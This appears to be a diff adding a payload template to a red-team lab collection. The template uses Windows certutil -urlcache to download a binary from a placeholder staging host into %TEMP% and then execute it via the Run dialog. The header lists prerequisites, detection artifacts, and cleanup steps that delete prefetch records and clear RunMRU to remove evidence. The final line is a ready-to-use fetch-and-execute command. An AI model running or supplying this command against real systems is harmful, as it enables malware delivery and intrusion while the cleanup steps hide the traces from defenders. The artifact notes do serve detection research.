@@ -1,0 +1,21 @@
+# TEMPLATE: certutil-001
+# CLASS: certutil -urlcache download + exec (staged, Run dialog)
+# AUTHORIZATION: Authorized lab security research only — see payloads/README.md.
+#   STAGING_HOST must be a lab placeholder (attacker.example / RFC1918 10.x, example-only).
+# PURPOSE: Abuse certutil.exe's -urlcache verification-fetch flag as a legacy
+#   download primitive (works on pre-1803 builds where curl.exe is absent),
+#   writing the staged binary to %TEMP% and executing it via cmd /c chaining.
+# PREREQUISITES: certutil.exe present (all Windows 10 builds); outbound HTTP
+#   to STAGING_HOST; OUTPUT_NAME hosted at STAGED_PATH.
+# CLEANUP: Delete %TEMP%\<OUTPUT_NAME>; clear Run MRU; remove
+#   C:\Windows\Prefetch\CERTUTIL-EXE*.pf and <OUTPUT>-*.pf prefetch records.
+# ARTIFACT: Process: cmd.exe -> certutil.exe -> downloaded child process chain.
+# ARTIFACT: File: %TEMP%\<OUTPUT_NAME> written by certutil.exe.
+# ARTIFACT: Network: HTTP GET to STAGING_HOST with the distinctive
+#   User-Agent string "CertUtil URL Cache" (strong IOC).
+# ARTIFACT: Console: certutil prints its progress banner unless silenced;
+#   this template does not redirect, so a console window appears briefly.
+# ARTIFACT: Registry: RunMRU value contains the full command string.
+# ARTIFACT: Prefetch: CERTUTIL-EXE prefetch record if prefetch enabled.
+# ---
+cmd /c "certutil -urlcache -f http://<STAGING_HOST>/<STAGED_PATH>/<OUTPUT_NAME> %TEMP%\<OUTPUT_NAME> && %TEMP%\<OUTPUT_NAME>"
